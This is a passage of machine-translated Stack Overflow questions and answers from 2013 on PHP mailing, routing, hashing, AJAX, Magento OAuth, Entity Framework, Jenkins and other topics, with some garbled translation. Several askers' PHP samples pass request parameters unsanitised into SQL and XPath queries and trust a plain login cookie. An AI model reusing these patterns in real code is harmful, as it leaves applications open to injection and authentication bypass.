-rwxrw-r--  1 root  admin  5069718 Apr  6 14:52 /foo/bar/baz 
```

用户可读、可*写、可执行*，组内任何用户均可*读写*。任何不在该组中或不在该组中的用户对该文件只有*读访问权。*这就是“其他”所指的。`root`*`admin``root``admin`*

 **这只是关于进程运行的用户，而不是关于“计算机上的东西与网站访问者”。“网站访问者”不是 UNIX 权限涵盖的概念。

由于 Apache 通常运行为`daemon`，因此使文件由`daemon`或至少属于该组`daemon`，并使它们对该用户和/或组*可读和可执行。*如果*Apache*需要对某些文件或目录的写入权限，还可以在需要时选择性地启用写入权限（例如，日志文件）。是否可以通过 HTTP 公开访问*URL*和脚本是由 Apache 控制的，而不是由 UNIX 权限控制的。**

# php - 使用 SMTP、PHPmailer 发送邮件时如何知道邮件是由用户发送和阅读的

> ID：15847476
> 
> 赞同：6
> 
> 时间：2013-04-06T05:43:57.967
> 
> 标签：php, smtp, gmail, sendmail, phpmailer

有人知道以下问题的任何解决方案吗

在我的项目中，我使用 smtp 和 php mailer 和 gmail 脚本向客户端发送电子邮件。所以当我发送邮件时，gmail 发送邮件给特定的客户。为此，我正在传递有效的 gmail 登录名和用户名。所有邮件都正确发送。但有时可能会发生某些客户未收到邮件的情况，当时我无法获取或跟踪任何错误。所以我有任何办法，当我向客户发送邮件时，当客户收到并阅读它时，我得到了任何形式的确认。

如果有人有任何想法，请帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:58:02.597

```
<?php
/**
* Simple example script using PHPMailer with exceptions enabled
* @package phpmailer
* @version $Id$
*/

require ('../class.phpmailer.php');

try {
        $mail = new PHPMailer(true); //New instance, with exceptions enabled

        $body             = "Please return read receipt to me.";
        $body             = preg_replace('/\\\\/','', $body); //Strip backslashes

        $mail->IsSMTP();                           // tell the class to use SMTP
        $mail->SMTPAuth   = true;                  // enable SMTP authentication
        $mail->Port       = 25;                    // set the SMTP server port
        $mail->Host       = "SMTP SERVER IP/DOMAIN"; // SMTP server
        $mail->Username   = "EMAIL USER ACCOUNT";     // SMTP server username
        $mail->Password   = "EMAIL USER PASSWORD";            // SMTP server password

        $mail->IsSendmail();  // tell the class to use Sendmail

        $mail->AddReplyTo("someone@something.com","SOMEONE");

        $mail->From       = "someone@something.com";
        $mail->FromName   = "SOMEONE";

        $to = "other@something.com";

        $mail->AddAddress($to);

        $mail->Subject  = "First PHPMailer Message[Test Read Receipt]";

        $mail->ConfirmReadingTo = "someone@something.com"; //this is the command to request for read receipt. The read receipt email will send to the email address.

        $mail->AltBody    = "Please return read receipt to me."; // optional, comment out and test
        $mail->WordWrap   = 80; // set word wrap

        $mail->MsgHTML($body);

        $mail->IsHTML(true); // send as HTML

        $mail->Send();
        echo 'Message has been sent.';
} catch (phpmailerException $e) {
        echo $e->errorMessage();
}
?> 
```

需要在上面的脚本中进行一些修改。

1.  配置 SMTP 邮件服务器。

2.  设置正确的 FROM & FROM Name (someone@something.com, SOMEONE)

3.  设置正确的 TO 地址

[从](http://www.how2guru.com/archives/php-send-email-request-read-receipt/)

还

1.  [PHP 邮件中的投递报告和已读回执](https://stackoverflow.com/questions/1078251/delivery-reports-and-read-receipts-in-php-mail)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:32:48.447

您可以通过两种不同的方式检查事情，例如通过在您的邮件功能中使用标题“Disposition-Notification-To”，它不会在所有情况下都起作用，因为大多数人选择不发送已读回执。如果您可以从您的服务器影响这是否发生，垃圾邮件发送者可以很容易地轻松识别活动和非活动电子邮件地址。您可以设置标题

```
$email_header .= "Disposition-Notification-To: $from"; 
$email_header .= "X-Confirm-Reading-To: $from"; 
```

现在检查的另一种方法是放置图像，您可以添加一个脚本来加载该图像，该脚本将向您的系统发送通知，告知您 xxx 用户已阅读邮件，这样您就可以跟踪邮件的发送状态邮件。

事实上，我想不出任何方法来确认它已经交付，而不检查它是否被读取，或者通过包含从您的服务器请求并记录为已访问的图像，或者用户必须访问的链接到查看消息的完整内容。

两者都不能保证（并非所有电子邮件客户端都会显示图像或使用 HTML），并且并非所有“已传递”的消息都会被阅读。

虽然有关更多信息[https://en.wikipedia.org/wiki/Email_tracking](https://en.wikipedia.org/wiki/Email_tracking)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:50:48.627

您可以随时添加回复邮件地址，如果有任何错误，您会收到电子邮件，如果已阅读，请附上一张图片（1像素的空白图片即可）并在该图片中添加代码，例如和您可以查看该图像确实收到了多少点击或根本没有收到任何点击。

# php - 使用php自动请求url

> ID：15847478
> 
> 赞同：0
> 
> 时间：2013-04-06T05:44:34.097
> 
> 标签：php, oop, routing, automation

好的，所以我一直在考虑为特定市场开发自己的自定义 CMS 系统，并且我一直在研究一些框架，我遇到的问题是它们不能自动路由。在 laravel 中，如果我没记错地响应这样的 url，你会做这样的事情：

```
Route::get('/user', function()
{
    return "This is a user";
}); 
```

这基本上会监听一个特定的请求。现在我简化这个的想法是创建一个自动路由器。所以我所做的是设置一个 .htaccess 文件，它接受每个请求并将其定向到 index.php。它还在 .com 之后接受了任何内容，因此类似于`www.testsite.com/admin/pages/edit/5`并将其附加为 get 变量。

所以在上面的例子中，我传递了一个请求的四个参数：

```
admin   -   request path / used to signify a login check must be done before passing 
            them on to their request
pages   -   This would be the class or object
edit    -   This would be the method called from the class / object
5       -   This would be the actual row of the record in the database being edited 
```

所以我开发了一个看起来像这样的路由器类：

```
class router {

     public $url;
     public $protectedPaths = array('admin','users','client');

     public function __construct() {
          $this -> url = explode('/', $_GET['url']);

          if($this -> url[0] == '') {
               $this -> loadDefaultView();
          } else {
               // Check to ensure that the path is not protected
               if(in_array($this -> url[0], $this -> protectedPaths)) {

                    // check to ensure user is logged in
                    if($_COOKIE['isLogged']) {

                         // This means that there is no action or model needed just a returned view
                         if($this -> url[2] == '') {

                              $this -> loadViewWithoutAction();

                         } else {
                              // we check to ensure there is a controller
                              if(file_exists(baseControllers .'controller.'. $this -> url[1] .'.php')) {

                                   // require that controller and instantiate it
                                   require baseControllers .'controller.'. $this -> url[1] .'.php';
                                   $obj = new $this -> url[1];

                                   // check to see if method exists
                                   if(method_exists($obj, $this -> url[2])) {

                                        if($_POST) {
                                             $data = $_POST;
                                        } else {
                                             $data = array($this -> url[3]);
                                        }

                                        // run method if necessary
                                        $data = call_user_func_array(array($obj, $this -> url[2]), $data);
                                        $this -> loadAdminView( $data );

                                   } else {
                                        $this -> loadErrorView();
                                   }

                              } else {
                                   $this -> loadErrorView();
                              }
                         }
                    } else {
                         header("Location: /auth/form");
                    }

               } else {

                    // we check to ensure there is a controller
                    if(file_exists(baseControllers .'controller.'. $this -> url[0] .'.php')) {

                         // require that controller and instantiate it
                         require baseControllers .'controller.'. $this -> url[0] .'.php';
                         $obj = new $this -> url[0];

                         // check to see if method exists
                         if(method_exists($obj, $this -> url[1])) {

                              // run method if necessary
                              $data = call_user_func_array(array($obj, $this -> url[1]), array($this -> url[2]));
                              $this -> loadPublicView( $data );

                         } else {
                              $this -> loadErrorView();
                         }

                    } else {
                         $this -> loadErrorView();
                    }

               }

          }
     } 
```

所以我会使用许多不同的 if else 语句，也许还有一个 switch 来区分不同的请求等。最后我的问题是，自动加载一个类并运行一个方法是这种不好的做法。从我在框架中看到的情况来看，这都是手动的，我不是专家，所以我假设这可能是有原因的。此外，我几乎没有发现任何关于在 Web 上的 OOP 中自动执行 PHP 请求的内容。

我真的很想自动化这个，但同时我也不想引起安全问题。哦，对于用户输入的任何表格或个人信息，所有内容都将被发布或 ajax 以防止 url 被黑客入侵。

感谢您提前提供任何建议或答案！

# compiler-construction - 用托管语言编写内存管理器？

> ID：15847480
> 
> 赞同：5
> 
> 时间：2013-04-06T05:45:04.723
> 
> 标签：compiler-construction, garbage-collection, programming-languages, runtime

Jikes RVM 是一个元循环 Java 运行时，它的分配器/收集器似乎是用 Java (MMTK) 编写的。

那么，当您的垃圾收集器需要垃圾收集器运行时，它是如何工作的呢？通过查看代码，我没有看到 MMTK 将自身限制为 Java 的任何特定子集，但在我看来，如果您的用于分配托管内存的代码需要分配托管内存才能运行，那么它将进入递归旋转直到它爆炸。

但显然 MMTK 有效，显然其他一些项目也在使用它。如何用 Java 这样的托管语言编写内存分配器和 GC？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-17T22:20:13.487

有很多这样的例子。我不熟悉 Jikes 的实现，但我确实阅读了基于 Java 的设计和 PyPy。它们中的大多数的共同点是将事物分为两个级别：运行时/解释器级别和应用程序级别。每个级别都有自己的对象、异常、执行流程等。

当你抽象地思考它时，它实际上更容易理解。运行时层可能已写入内存管理或未管理、低级或高级、命令式或功能性。这并不重要。重要的是它的功能，它的作用。它最终被翻译成机器代码，所有机器代码对机器都是一样的。该代码将操作码和数据作为输入，基于此执行预定义的操作，管理资源等。

应用层包含在这些操作码中。应用层代表另一个整体功能，它接收输入、处理输入并执行输出。这些步骤也可能具有内置的内存管理例程。运行时并不关心操作码在做什么，只要它们是有效的并且它只是执行它们。理论上，您可以编写包含 GC 语言的 GC 语言，该语言包含 GC 语言......等等，直到您达到 ENIAC 速度。;)

我想说像 Jikes 这样的设计的不同之处在于它们的效率（有时是灵活性）。用 GC 语言编写 GC、解释器或运行时是不够的。结果必须是可用的，这通常意味着速度。可能还需要在应用层处理本地代码集成。大多数真正的工作都涉及到这些东西。仅在 GC 语言中运行 GC 是真正容易的部分：这基本上只是在不同的抽象级别标记和管理对象。

注意：如果您对 GC 语言和基于 GC 的运行时进行代码设计，则可以利用这一点来提高性能和简单性。例如，与其运行两个完整的垃圾收集器，一个在另一个之上，您可以在底部有一个更智能的 GC，在顶部有一个瘦 GC。更智能的 GC 知道运行时和应用程序级别之间的区别，确保分别对它们进行操作，并且不会进行不当混合。瘦顶 GC 本质上只是对主 GC 进行过程调用或以主 GC 理解的方式标记对象，但这不会增加大量开销。

关于这类项目的事情是每个项目都有点不同。目标语言和实现语言的性质在很大程度上决定了设计选择。为您提供大量机会来创造性地解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-22T04:41:35.197

Which answer do you want:
- "It's just a bootstrap process, what's the big deal?"
or
- "It's magic! (That is to say, a technology more advanced than one currently comprehends.)"

The first **C** compilers were written in, get this, **C**. How was the first operating system written? To one who has spent an afternoon labouriously creating a paper-tape bootstrap *one-tedious-bit-after-another* using toggle switches and console lights (on an 18-bit DEC PDP-15), none of this is a mystery anymore. One simply starts with the most advanced pieces that can be re-used, and build tools of increasing complexity until the tool kit is adequate to build the application.

# php - sha1、crc32 和 md5 如何读取这些数据？

> ID：15847481
> 
> 赞同：0
> 
> 时间：2013-04-06T05:45:09.177
> 
> 标签：php, xml, md5, sha1, crc32

如何解码 md5、crc32 和 sha1，下面是 xml 文件，然后是到目前为止我用来获取数据的代码。

```
<files>
  <file name="AtTheInn-Germany-Morrow78Collection.mp3" source="original">
    <format>VBR MP3</format>
    <title>At the Inn - Germany - Morrow 78 collection</title>
    <md5>056bbd63961450d9684ca54b35caed45</md5>
    <creator>Germany</creator>
    <album>Morrow 78 collection</album>
    <mtime>1256879264</mtime>
    <size>2165481</size>
    <crc32>22bab6a</crc32>
    <sha1>796fccc9b9dd9732612ee626c615050fd5d7483c</sha1>
    <length>179.59</length>
  </file> 
```

这是我用来获取标题和专辑名称的代码我如何理解 sha1 和 md5，对任何方向的任何帮助都会有所帮助，谢谢

```
<?php
    $search = $_GET['sku'];
    $catalogfile = $_GET['file'];
        $directory = "feeds/";
        $xmlfile = $directory . $catalogfile;
$xml = simplexml_load_file($xmlfile);

list($product) = $xml->xpath("//file[crc32 = '$search']");
echo "<head>";
echo "<title>$product->title</title>"; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T05:48:26.177

MD5、SHA-1 和 CRC32 是*散列函数*。这意味着它们不能被逆转。¹您会更幸运地查看标签`name`的该属性。`file`

¹你可以²暴力破解它们，但由于它们可以将可变长度数据表示为固定长度的数据，由于鸽巢原理和简单的概率，你更有可能得到*不是*原始输入的东西比原来的输入。

²不过，SHA-1 需要很长时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:22:51.530

哈希函数生成代表一些任意数据的数字。它们可以用来验证数据是否发生了变化（一个好的散列函数应该产生一个完全不同的散列，即使一个比特发生了变化）。

由于您正在将任意数量的数据转换为数字，因此您会丢失信息，这意味着很难反转它们。从技术上讲，由于数据可以是任意长度，因此散列有无数种可能的结果。对于有限的数据大小，特定哈希仍然可能存在多个数据值，这称为冲突。

对于某些数据集（例如密码），您可以生成所有可能的数据组合并检查它们是否与哈希匹配。如果您在检查的同时进行生成，则称为“蛮力强制”。您还可以存储所有可能的组合（对于有限的范围，例如所有字典作品或特定大小下的所有字符组合），然后查找。这被称为彩虹表，对于反转多个哈希很有用。

将密码存储为哈希而不是纯文本是一种很好的做法，但为了确保密码难以反转，他们会在每个密码中添加一些随机数据并将其与密码一起存储，这称为加盐。这种盐意味着暴力破解密码需要更长的时间。

在这种情况下，它们可能是指定用于验证文件完整性并显示传输（或存储）期间发生的任何损坏的 mp3 文件的哈希值。不可能逆转它们，因为您必须生成所有可能的兆字节数据组合。但是，如果您拥有文件本身，也没有任何理由。您可以通过在其上运行校验和生成程序来确认它们是文件的哈希值。

# joomla - 在组件中嵌入 joomla 模块

> ID：15847484
> 
> 赞同：0
> 
> 时间：2013-04-06T05:45:33.513
> 
> 标签：joomla, module

我想在 joomla-2.5 的组件中显示一个模块。我尝试了下面的代码，但它不起作用。

```
jimport('joomla.application.module.helper');
$modules = JModuleHelper::getModules('latest albums'); 
foreach($modules as $module)
{
echo JModuleHelper::renderModule($module);
} 
```

“最新专辑”是我模块的标题。我也单独使用了 mod_name 和 (mod_name,mod title) 一起使用，但它们没有用。

我该如何解决。谢谢

# javascript - Jquery 表单验证

> ID：15847486
> 
> 赞同：0
> 
> 时间：2013-04-06T05:45:36.870
> 
> 标签：javascript, jquery, validation

我在我的网络应用程序上使用以下验证代码

演示：[http ://www.position-relative.net/creation/formValidator/demos/demoValidators.html](http://www.position-relative.net/creation/formValidator/demos/demoValidators.html)

10秒后有没有办法隐藏那个弹出的东西？现在，当您提交时，它会继续显示....

这些是用于产生这种效果的代码

[http://www.position-relative.net/creation/formValidator/js/languages/jquery.validationEngine-en.js](http://www.position-relative.net/creation/formValidator/js/languages/jquery.validationEngine-en.js) [http://www.position-relative.net/creation/formValidator/js/jquery.validationEngine.js](http://www.position-relative.net/creation/formValidator/js/jquery.validationEngine.js)

```
<script>
        jQuery(document).ready(function(){
            // binds form submission and fields to the validation engine
            jQuery("#formID").validationEngine();
        });

        /**
        *
        * @param {jqObject} the field where the validation applies
        * @param {Array[String]} validation rules for this field
        * @param {int} rule index
        * @param {Map} form options
        * @return an error string if validation failed
        */
        function checkHELLO(field, rules, i, options){
            if (field.val() != "HELLO") {
                // this allows to use i18 for the error msgs
                return options.allrules.validate2fields.alertText;
            }
        }
    </script> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:17:22.403

```
var t = setInterval(function() {
   //alert('b');
   $(".formErrorContent").hide();
   $(".line1").hide();$(".line2").hide();$(".line3").hide();$(".line4").hide();$(".line5").hide();
   $(".line6").hide();$(".line7").hide();$(".line8").hide();$(".line9").hide();$(".line10").hide();
   },8000); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-06T06:13:15.243

这段代码放在上面的标题标签上

```
<script>

    setInterval(function() {
        $(".formError").parent('.formErrorOuter').remove();
        $(".formError").remove();
},  2000);
</script> 
```

试试看吧。

# php - javascript ajax php 显示

> ID：15847488
> 
> 赞同：0
> 
> 时间：2013-04-06T05:45:43.333
> 
> 标签：php, javascript, mysql, ajax

通过使用javascript ajax，我已将值传递给php页面...从数据库中检索并在ajax页面中打印后显示值...它显示在警报页面中...但我需要在ajax页面中显示...。

ajax 编码

```
<script>
        function optionsAlert()
        {
            alert("call");
            var xmlhttp;
            var qw=document.getElementById('c').value;
            var qw1=document.getElementById('c1').value;
            var qw2=document.getElementById('unit33').value;
            var qw3=document.getElementById('dept').value;
            var qw4=document.getElementById('class').value;
            alert(qw);
            alert(qw1);
            alert(qw2);
            alert(qw3);
            alert(qw4);

            if (window.XMLHttpRequest)
            {// code for IE7+, Firefox, Chrome, Opera, Safari
                xmlhttp=new XMLHttpRequest();
            }
            else
            {// code for IE6, IE5
                xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
            }
            xmlhttp.onreadystatechange=function()
            {
             if (xmlhttp.readyState==4 && xmlhttp.status==200)
             {
                alert(xmlhttp.responseText);    

                if(xmlhttp.responseText==1){
                alert("name already Exists" );                  
                return false;   
                }        
               else if(xmlhttp.responseText==0)
               {
                alert("name available");
                document.login.submit();    
               }

            }
         }

            var queryString = "?q=" + qw + "&q1=" + qw1 + "&q2=" + qw2 + "&q3=" + qw3 + "&q4=" + qw4;
            xmlhttp.open("get",'ques.php' + queryString,true);
            xmlhttp.send();
        } 
```

页面

```
<?php 
include('connection.php'); 
if(($_GET['q']!='') && ($_GET['q1']!='') && ($_GET['q2']!='') && ($_GET['q3']!='') && ($_GET['q4']!=''))
{
    $a= mysql_query("select * from unit1 where unit='".$_GET['q']."' and stopic='".$_GET['q1']."' and qtype='".$_GET['q2']."' and dept='".$_GET['q3']."' and class='".$_GET['q4']."'");
    //$a= mysql_query("select * from unit1 where unit='unit1' and stopic='Subtopic1' and qtype='normal questions'");
    if(mysql_num_rows($a)>0)
    {
        while($row=mysql_fetch_array($a))
        {
            $a1=$row['qno'];
            $a2=$row['ques'];
            $a3=$row['ch1'];
            $a4=$row['ch2'];
            $a5=$row['ch3'];
            $a6=$row['ch4'];
            $a7=$row['ans'];
            echo $a1."<br>";echo $a2."<br>";echo $a3."<br>";echo $a4."<br>";echo $a5."<br>";echo $a6."<br>";echo $a7."<br>";
            echo 1;
        }
    }
    else
    {
        echo 0;
    }
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:58:51.990

在 ajax 编码下面创建带有 id 的 div 元素

在你的 ajax 方法中

```
if(xmlhttp.responseText==1){
                document.getElementById("id").innerHTML = "name already Exists";                   
                return false;   
                }        
               else if(xmlhttp.responseText==0)
               {
                document.getElementById("id").innerHTML="name available";
                document.login.submit();    
               } 
```

"id" 你自己的 div id

# search - 反转文件与签名文件

> ID：15847498
> 
> 赞同：3
> 
> 时间：2013-04-06T05:46:50.383
> 
> 标签：search, full-text-search, search-engine, information-retrieval

关于信息检索，

我相当理解倒排索引/文件的概念。知道签名文件比倒置文件多。但我不明白签名文件概念背后的概念？

任何人都可以解释其中的区别或指出我可以在哪里读到它吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T13:23:09.673

[我在本文](http://www.users.muohio.edu/canf/papers/ipm04b.pdf)的第 6 页找到了一个很好的解释。目前，我不相信签名文件优于倒排索引的优势。

# magento - magento api不适用于客户

> ID：15847499
> 
> 赞同：1
> 
> 时间：2013-04-06T05:46:50.947
> 
> 标签：magento, content-management-system

我使用firefox的“rest client”插件将以下标头信息传递给url“ **localhost/magento/api/rest/customers** ”，

我通过以下标题信息：

```
Consumer key :olnnqgwm7gm75rtbft8w1wac4kp4vwig
 Consumer secret:u9v6bdlpuopdlryc6vx0yjnslkj4vllo
 Access token : null
 Access token secret : null 
```

我将给出以下回应：

```
<magento_api>
<messages>
<error>
<data_item>
<code>401</code>
<message>
oauth_problem=parameter_absent&oauth_parameters_absent=oauth_token
</message>
</data_item>
</error>
</messages>
</magento_api> 
```

所以在这里我想获取**访问令牌**和**访问令牌秘密**如何获取它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T07:27:42.837

```
Access token : null
Access token secret : null 
```

这是通过 REST Api 获取客户详细信息的必要条件。[您必须按照此处](http://www.magentocommerce.com/api/rest/authentication/oauth_authentication.html)定义的方式配置身份验证过程，请仔细阅读本文，您将得到答案。

1.  获取未经授权的请求令牌

> **URI** localhost/magento/oauth/initiate
> 
> **方法：** POST
> 
> **返回：示例响应：** oauth_token=4cqw0r7vo0s5goyyqnjb72sqj3vxwr0h&oauth_token_secret=rig3x3j5a9z5j6d4ubjwyf9f1l21itrr&oauth_callback_confirmed=true

2.用户授权

> **Uri** : localhost/magento/oauth/authorize
> 
> **方法：** 获取
> 
> **示例响应：** /callback?oauth_token=tz2kmxyf3lagl3o95xnox9ia15k6mpt3&oauth_verifier=cbwwh03alr5huiz5c76wi4l21zf05eb0
> 
> **注意**：认证的第二步。没有这一步的用户授权，你的应用是不可能获取到Access Token的。

3.获取访问令牌

> **Uri** : localhost/magento/oauth/token
> 
> **方法：** POST
> 
> **示例响应：** oauth_token=0lnuajnuzeei2o8xcddii5us77xnb6v0&oauth_token_secret=1c6d2hycnir5ygf39fycs6zhtaagx8pd

如果您完成上述所有步骤，您将获得可用于获取客户响应的访问令牌和密码

# c# - 将我的应用程序发布给用户

> ID：15847506
> 
> 赞同：1
> 
> 时间：2013-04-06T05:47:23.203
> 
> 标签：c#, windows, forms

在其他 PC 上运行我的应用程序时，我遇到了复杂情况。

我可以在 Visual Studio 2012 中做些什么来确保任何 PC 都可以轻松运行我的应用程序？

这些是我所知道的并发症：

我的应用程序是使用 Windows 7 在 Visual Studio 2012 中构建的 Windows 窗体。这是我第一次为其他用户构建应用程序。

我在这里发现了一个类似的相关问题：

[http://blogs.msdn.com/b/vsnetsetup/archive/2012/10/16/setup-exe-is-not-a-valid-win32-application.aspx](http://blogs.msdn.com/b/vsnetsetup/archive/2012/10/16/setup-exe-is-not-a-valid-win32-application.aspx)

但是，这并没有解决错误。我已确保 Configuration Manager 目标平台是 Any CPU。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T09:54:34.767

在安装了 .NET 4.5 的 WinXP 和 Win7 机器上运行正常。

您能否尝试针对较低的框架版本进行构建（在表单项目属性下，将目标框架更改为 3.5 或 4.0）并在失败的计算机上重试？如果它运行正确，您可以继续针对较低版本进行构建，或者以最佳方式确保您的安装程序检查是否安装了正确的框架版本。

# c# - 实体框架更新语句导致错误

> ID：15847508
> 
> 赞同：0
> 
> 时间：2013-04-06T05:47:46.063
> 
> 标签：c#, entity-framework

```
 public bool UpdateValues(String impR, String actR, String proR, String impV, String magV)
 {
        bool IsInserted = false;

        try
        {
            MatrixValues c = cecbContext.MatrixValues.First(i => i.actv_reference == actR); // primary key
            c = cecbContext.MatrixValues.First(i => i.impt_reference == impR); // primary key
            c = cecbContext.MatrixValues.First(i => i.proj_reference == proR); // primary key

            c.mtrxV_importance = double.Parse(impV); // updated value
            c.mtrxV_magnitude = double.Parse(magV);  // updated value

            cecbContext.SaveChanges();  // getting an error here!!!

            IsInserted = true;
        }
        catch (Exception)
        {
            IsInserted = false;
        }

        return IsInserted;
    } 
```

尝试更新详细信息时出现错误

错误是

> 违反主键约束“PK_MatrixValues”。无法在对象“dbo.MatrixValues”中插入重复键。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:55:47.797

您正在`c`多次设置对象；如果最后一条语句足够了；然后不要使用以前的；如果要`c`使用多个条件选择对象，则需要更改以下行；

```
MatrixValues c = cecbContext.MatrixValues.First(i => i.actv_reference == actR); // primary key
  c = cecbContext.MatrixValues.First(i => i.impt_reference == impR); // primary key
  c = cecbContext.MatrixValues.First(i => i.proj_reference == proR); // primary key 
```

到：

```
MatrixValues c = cecbContext.MatrixValues.First(i => i.actv_reference == actR && c.impt_reference == impR && c.proj_reference == proR); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:54:35.420

> 违反主键约束“PK_MatrixValues”。无法在对象“dbo.MatrixValues”中插入重复键

这意味着该字段包含主键。它不允许重复的条目

# javascript - JQuery Masonry 在第一张图片后中断，加载奇怪的间隙

> ID：15847514
> 
> 赞同：0
> 
> 时间：2013-04-06T05:48:29.907
> 
> 标签：javascript, jquery, tumblr, jquery-masonry, infinite-scroll

我在 Tumblr 主题上使用 Infinite Scroll 实现 Masonry——这是我以前成功做过的事情，但我就是无法让这个停止“破坏”和分散图像。越来越绝望！

[在neuraldamage-theme4.tumblr.com](http://neuraldamage-theme4.tumblr.com)进行现场演示（密码是guest）。

除了#posts div及其内容（当然还有脚本）之外，我已经尝试从body标签中删除所有内容，但问题仍然存在——所以看起来这不应该是周围div的问题。

这是我的脚本：

```
$(document).ready(function() {
    $('#post-video iframe').attr('width', '300');   // resize embedded videos
});

var $container = $('#posts');

$container.imagesLoaded( function(){
    $container.masonry({
        itemSelector : '.post',
        columnWidth : 300
    });
});

$container.infinitescroll({
    navSelector  : '#pagination',    // selector for the paged navigation 
    nextSelector : '#pagination li a.pagination_nextlink',  // selector for the NEXT link (to page 2)
    itemSelector : '.post',     // selector for all items you'll retrieve
    loading: {
        finishedMsg: '',
        img: 'http://static.tumblr.com/6u5yyqj/iUtmgivzo/loading.gif',  // http://static.tumblr.com/6u5yyqj/iUtmgivzo/loading.gif, http://static.tumblr.com/6u5yyqj/yWkmgj1jq/loadingdark.gif
    }
    },
    // trigger Masonry as a callback
    function( newElements ) {
        var $newElems = $( newElements );
        $container.masonry( 'appended', $newElems );
    }
); 
```

这是我嵌入的内容，只是确保它是最新的：

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="http://static.tumblr.com/6u5yyqj/MPKmktfkv/jquery.masonry.min.js"></script>
<script src="http://static.tumblr.com/6u5yyqj/nsQmkth3k/jquery.infinitescroll.min.js"></script> 
```

如果您想查看完整代码：[gist.github.com/neuraldamage/5307289](https://gist.github.com/neuraldamage/5307289)

如果有人能对此有所了解，我将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:56:30.017

问题是这样的：

```
<div id="posts" style="position: relative; height: 483px;" class="masonry"> 
```

更改该高度以适应您的内容（因为它不够大），或者根本不声明它。

当我检查该元素时，我只是删除了该`height`值，然后所有内容都已到位。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-07T21:07:48.953

它遇到了一堆问题，因为您实际上`<div id="posts">`在页面上有多个。可能是您的 Tumblr 代码出现的问题超出了应有的范围。

# sql-server-2008 - 如何将“mm/yyyy”varchar 转换为日期时间？

> ID：15847517
> 
> 赞同：0
> 
> 时间：2013-04-06T05:48:50.987
> 
> 标签：sql-server-2008

我有一个以`"mm/yyyy"`格式存储的日期，它的数据类型是 varchar。

我想以`"mm/dd/yyyy"`格式获取日期

eg：`4/2013`存储在数据库中

我想

```
30/4/2013 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T11:33:18.267

```
DECLARE @d VARCHAR(32) = '4/2013';

-- as a datetime

SELECT DATEADD(DAY,-1,DATEADD(MONTH,1,
  CONVERT(DATETIME,'1/'+@d,103)));

-- as a date

SELECT CONVERT(DATE, DATEADD(DAY,-1,DATEADD(MONTH,1,
  CONVERT(DATETIME,'1/'+@d,103))));

-- as an ambiguously formatted regional string

SELECT CONVERT(CHAR(10), DATEADD(DAY,-1,DATEADD(MONTH,1,
  CONVERT(DATETIME,'1/'+@d,103))),103); 
```

这很烦人吗？好的！首先以正确的方式存储日期。并且停止将数据库视为以特定格式存储/呈现日期的地方 - 在必要时在客户端进行格式化，通常区域格式无论如何都是一个坏主意，除非您的受众非常有限。

# jenkins - 为什么詹金斯会改变我的 gradlew，以及如何防止这种情况发生？

> ID：15847518
> 
> 赞同：3
> 
> 时间：2013-04-06T05:48:54.640
> 
> 标签：jenkins, gradle, gradlew, gradle-release-plugin

我正在尝试使用[gradle release-plugin来“发布”我的项目](https://github.com/townsfolk/gradle-release)

该插件首先检查我的工作副本是否干净，以便仅发布正确版本的内容。

这在我的本地机器上工作得很好。但是当我在 Jenkins 的工作中尝试同样的事情时，构建失败并抱怨工作场所中的各种东西发生了变化。我决定詹金斯在内部使用了很多东西并将其添加到`gitignore`：

```
caches/
native/
wrapper/ 
```

但它也认为`gradlew`改变了：

```
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':checkCommitNeeded'.
> You have uncommitted files:
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   M gradlew
  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
```

**为什么詹金斯更改该文件我该如何防止？**

我认为 Jenkins 工作的以下设置可能是相关的：

*   `Checkout/merge to local branch (optional)`设置为主。如果没有此设置，发布插件会抱怨不在分支上

*   `Clean after checkout`当前已选中，但选中/取消选中它没有任何区别

*   `Make gradlew executable`已检查，至少对我来说听起来像是一个可能的原因，但取消选中它会使构建失败，因为 gradlew 不可执行

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2015-11-12T13:41:09.063

很老的问题，但为了记录到这里来的任何人，詹金斯在这里没有错，你应该提交 gradlew 并设置可执行位：

```
# git update-index --chmod=+x gradlew
# git commit 
```

然后，您将不再需要 jenkins 设置来将其设置为可执行，这是导致您的问题的解决方法。

# android - 由于快速返回按钮按下而导致崩溃

> ID：15847521
> 
> 赞同：0
> 
> 时间：2013-04-06T05:49:31.163
> 
> 标签：android, android-fragments

当我按一次返回按钮时，应用程序退出就好了。但是当我反复快速地按下 [Back] 按钮时，应用程序崩溃了（参考附加的堆栈跟踪）。即使没有执行任何片段事务也会发生。有办法治愈吗？

```
04-06 05:41:50.436: E/AndroidRuntime(2352): FATAL EXCEPTION: main
04-06 05:41:50.436: E/AndroidRuntime(2352): java.lang.IllegalStateException: Can not perform this action after onSaveInstanceState
04-06 05:41:50.436: E/AndroidRuntime(2352):     at android.support.v4.app.FragmentManagerImpl.checkStateLoss(FragmentManager.java:1327)
